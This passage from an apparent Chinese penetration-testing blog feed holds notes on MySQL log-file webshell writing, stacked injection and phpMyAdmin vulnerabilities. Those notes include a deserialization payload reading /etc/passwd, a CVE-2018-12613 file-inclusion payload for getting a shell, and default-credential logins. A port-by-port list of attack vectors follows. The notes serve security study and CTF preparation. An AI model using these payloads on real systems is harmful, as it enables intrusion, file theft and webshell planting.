host&#x3D;$HOST;</span><br></pre></td></tr></table></figure><ul><li><code>secure-file-priv</code>系统变量，对文件读/写功能进行限制<ul><li>无内容，表示无限制。</li><li>为NULL，表示禁止文件读/写。</li></ul></li><li>为目录名，表示仅允许对特定目录的文件进行读/写。</li></ul><p>mysql 5.5.53 本身及以后的版本默认值为NULL，之前的版本无内容。</p><p>查看当前的<code>secure-file-priv</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> @@secure_file_priv;</span><br><span class="line"><span class="keyword">select</span> @@global.secure_file_priv;</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">&quot;secure_file_priv&quot;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">MySQL [(none)]&gt; select @@secure_file_priv;</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| @@secure_file_priv |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| NULL               |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">MySQL [(<span class="keyword">none</span>)]&gt; <span class="keyword">select</span> <span class="keyword">version</span>();</span><br><span class="line">+<span class="comment">------------+</span></span><br><span class="line">| version()  |</span><br><span class="line">+<span class="comment">------------+</span></span><br><span class="line">| 5.6.46-log |</span><br><span class="line">+<span class="comment">------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>由于mysql在5.5.53版本之后，<code>secure-file-priv</code>的值默认为<code>NULL</code>，这使得正常读取文件的操作基本不可行。我们这里可以利用mysql生成日志文件的方法来绕过。</p><p>如果上面不行，就可以用日志进行攻击。（面试经常会问道。</p><p>mysql日志文件的一些相关设置可以直接通过命令来进行：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//请求日志</span><br><span class="line">mysql&gt; set global general_log_file = &#x27;/var/www/html/1.php&#x27;;</span><br><span class="line">mysql&gt; set global general_log = on;</span><br><span class="line">//慢查询日志</span><br><span class="line">mysql&gt; set global slow_query_log_file=&#x27;/var/www/html/2.php&#x27;</span><br><span class="line">mysql&gt; set global slow_query_log=1;</span><br><span class="line">//还有其他很多日志都可以进行利用</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>之后我们在让数据库执行满足记录条件的恶意语句即可。</p><p>限制：</p><ul><li>权限够，可以进行日志的设置操作</li><li>知道目标目录的绝对路径</li></ul><h3 id="堆叠注入Stack-Injection"><a href="#堆叠注入Stack-Injection" class="headerlink" title="堆叠注入Stack Injection"></a>堆叠注入Stack Injection</h3><p>PHP中堆叠注入的支持情况：</p><table><thead><tr><th align="left"></th><th align="left">Mysqli</th><th align="left">PDO</th><th align="left">MySQL</th></tr></thead><tbody><tr><td align="left">引入的PHP版本</td><td align="left">5.0</td><td align="left">5.0</td><td align="left">3.0之前</td></tr><tr><td align="left">PHP5.x是否包含</td><td align="left">是</td><td align="left">是</td><td align="left">是</td></tr><tr><td align="left">多语句执行支持情况</td><td align="left">是</td><td align="left">大多数</td><td align="left">否</td></tr></tbody></table><h1 id="phpmyadmin"><a href="#phpmyadmin" class="headerlink" title="phpmyadmin"></a>phpmyadmin</h1><ul><li>phpmyadmin2.x版本中存在一处反序列化漏洞，通过该漏洞，攻击者可以读取任意文件或执行任意代码。<ul><li>漏洞危害：无需登录，任意代码执行，任意文件读取</li><li>Payload: <code>action=test&amp;configuration=O:10:&quot;PMA_Config&quot;:1:&#123;s:6:&quot;source&quot;,s:11:&quot;/etc/passwd&quot;;&#125;</code></li></ul></li></ul><p>/scripts/setup.php</p><p><a href="https://github.com/vulhub/vulhub/blob/master/phpmyadmin/WooYun-2016-199433/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/phpmyadmin/WooYun-2016-199433/README.zh-cn.md</a></p><p><a href="https://hack-for.fun/posts/d68d.html">https://hack-for.fun/posts/d68d.html</a></p><ul><li>Phpmyadmin <strong>4.0.x – 4.6.2</strong> RCE</li></ul><p><a href="https://github.com/vulhub/vulhub/blob/master/phpmyadmin/CVE-2016-5734/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/phpmyadmin/CVE-2016-5734/README.zh-cn.md</a></p><p><a href="https://hack-for.fun/posts/8b82.html">https://hack-for.fun/posts/8b82.html</a></p><ul><li>Phpmyadmin<strong>4.8.1</strong> RFI</li></ul><p><a href="https://github.com/vulhub/vulhub/blob/master/phpmyadmin/CVE-2018-12613/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/phpmyadmin/CVE-2018-12613/README.zh-cn.md</a></p><p><a href="https://hack-for.fun/posts/ef94.html">https://hack-for.fun/posts/ef94.html</a></p><p>通过写入session, 然后包含session 文件进行getshell。</p><p>Payload:<code>index.php?target=db_sql.php%253f../../../../../tmp/sess_619cd5b47fc730f60a757f19ce6ea268</code></p><ul><li>phpmyadmin 通用密码漏洞</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">默认 phpMyAdmin：用户名 root、密码 root 或空登陆。</span><br><span class="line"></span><br><span class="line">版本 2.11.3～2.11.4：用户名 &#39;localhost&#39;@&#39;@&quot; 登陆，无需密码。</span><br><span class="line"></span><br><span class="line">版本 2.11.9.2：用户名 root 登陆，无需密码。</span><br></pre></td></tr></table></figure><ul><li>其他版本漏洞</li></ul><p><a href="https://blog.csdn.net/aiquan9342/article/details/102075632">https://blog.csdn.net/aiquan9342/article/details/102075632</a></p><p>一： 影响版本：3.5.x &lt; 3.5.8.1 and 4.0.0 &lt; 4.0.0-rc3 ANYUN.ORG</p><blockquote><p>　　概述：PhpMyAdmin存在PREG<em>REPLACE</em>EVAL漏洞</p><p>　　利用模块：exploit/multi/http/phpmyadmin<em>preg</em>replace CVE: CVE-2013-3238</p></blockquote><p>二： 影响版本：phpMyAdmin v3.5.2.2</p><blockquote><p>　　概述：PhpMyAdmin存在server<em>sync.php 后门漏洞</em></p><p>　　<em>利用模块：exploit/multi/http/phpmyadmin</em>3522_backdoor CVE: CVE-2012-5159</p></blockquote><p>三： 影响版本： 2.11.x &lt; 2.11.9.5 and 3.x &lt; 3.1.3.1;</p><blockquote><p>　　概述：PhpMyAdmin配置文件/config/config.inc.php存在命令执行</p><p>　　利用模块：exploit/unix/webapp/phpmyadmin_config CVE: CVE-2009-1151</p></blockquote><p>四:影响版本：2.11.3 / 2.11.4</p><blockquote><p>　　利用方法：用户名处写入‘localhost’@‘@”则登录成功。 (注意全部是英文标点符号，最后一个为英文双引号)</p></blockquote><p>五:影响版本：2.8.0.3</p><p>　　phpmyadmin配合phpinfo getshell</p><p>　　<a href="https://www.t00ls.net/thread-37889-1-1.html">https://www.t00ls.net/thread-37889-1-1.html</a></p><p>附上几个php爆绝对路径的办法：</p><blockquote><p>phpMyAdmin/libraries/select<em>lang.lib.php</em></p><p><em>phpMyAdmin/darkblue</em>orange/layout.inc.php phpMyAdmin/index.php?lang[]=1</p><p>phpmyadmin/themes/darkblue_orange/layout.inc.php</p></blockquote><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>特性很多，一篇文章肯定总结不过来。不过能总结一些还是好的，至少能够更加熟练。更重要的是，养成总结的习惯。</p><blockquote><p>不定期补充。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;一直觉得自己对相关的漏洞学的马马虎虎，没有深入总结，最近几次CTF比赛中也吃了不少的亏。遂想花一两天的时间来好好总结一下各个版本之间的区别，</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://hack-for.fun/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="PHP安全" scheme="https://hack-for.fun/tags/PHP%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>常见端口服务漏洞</title>
    <link href="https://hack-for.fun/e42fccb.html"/>
    <id>https://hack-for.fun/e42fccb.html</id>
    <published>2020-05-25T16:27:28.000Z</published>
    <updated>2020-10-30T13:01:06.057Z</updated>
    
    <content type="html"><![CDATA[<h1 id="列举"><a href="#列举" class="headerlink" title="列举"></a>列举</h1><p>21    ftp/tftp/vsftpd文件传输协议    爆破/嗅探/溢出/后门<br>22    ssh远程连接    爆破/openssh漏洞<br>23    Telnet远程连接    爆破/嗅探/弱口令<br>25    SMTP邮件服务    邮件伪造<br>53    DNS域名解析系统    域传送/劫持/缓存投毒/欺骗<br>81    Ipcam    登陆绕过/远程代码执行<br>110    pop3    爆破/嗅探<br>139    Samba服务    爆破/未授权访问/远程命令执行<br>143    Imap协议    爆破<br>389    Ldap目录访问协议    注入/未授权访问/弱口令<br>445    smb    ms17-010/端口溢出<br>873    Rsync服务    文件上传/未授权访问<br>1080    socket    爆破<br>1352    Lotus      domino邮件服务    爆破/信息泄漏<br>1433    mssql    爆破/注入/SA弱口令<br>1521    oracle    爆破/注入/TNS爆破/反弹shell<br>2049    Nfs服务    配置不当<br>2181    zookeeper服务    未授权访问<br>2375    docker      remote      api    未授权访问<br>3306    mysql    爆破/注入<br>3389    Rdp远程桌面链接    爆破/shift后门<br>4440    rundeck    弱口令admin<br>4848    GlassFish控制台    爆破/认证绕过<br>5000    sybase/DB2数据库    爆破/注入/提权<br>5432    postgresql    爆破/注入/缓冲区溢出<br>5632    pcanywhere服务    抓密码/代码执行<br>5900    vnc    爆破/认证绕过<br>6082    varnish    Varnish      HTTP      accelerator      CLI      未授权访问<br>6379    Redis数据库    未授权访问/爆破<br>67/68    dhcp服务    劫持/欺骗<br>8082    H2数据库    弱口令/空口令<br>8161    activemq    弱口令/写文件<br>8649    ganglia    信息泄漏<br>9000    fastcgi    远程命令执行<br>9090    Websphere控制台/用友    爆破/java反序列化/弱口令<br>11211    memcached    未授权访问<br>50000    SAP    SAP命令执行<br>80/443    http/https    web应用漏洞/心脏滴血<br>161：162    SNMP协议    爆破/搜集目标内网信息<br>2601:2604    zebra路由软件    默认密码zebra<br>3128：3312    squid    远程代码执行<br>7001/7002    weblogic    java反序列化/控制台弱口令<br>8083/8086    influxDB    未授权访问<br>9200/9300    elasticsearch    远程代码执行<br>512/513/514    Linux      Rexec服务    爆破/Rlogin登陆<br>61616/8161    ActiveMQ    未授权访问/默认密码/反序列化<br>8069/10050    zabbix服务    远程命令执行/注入<br>8000/8080/8089    Jboss/Tomcat/Resin    爆破/PUT文件上传/反序列化<br>27017/27018/28017    mongodb    未授权访问/爆破<br>8080/8088/50060:50070    hadoop    默认端口未授权访问</p><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>等我有空，</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;列举&quot;&gt;&lt;a href=&quot;#列举&quot; class=&quot;headerlink&quot; title=&quot;列举&quot;&gt;&lt;/a&gt;列举&lt;/h1&gt;&lt;p&gt;21    ftp/tftp/vsftpd文件传输协议    爆破/嗅探/溢出/后门&lt;br&gt;22    ssh远程连接    爆破/open</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://hack-for.fun/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="端口" scheme="https://hack-for.fun/tags/%E7%AB%AF%E5%8F%A3/"/>
    
  </entry>
  
</feed>
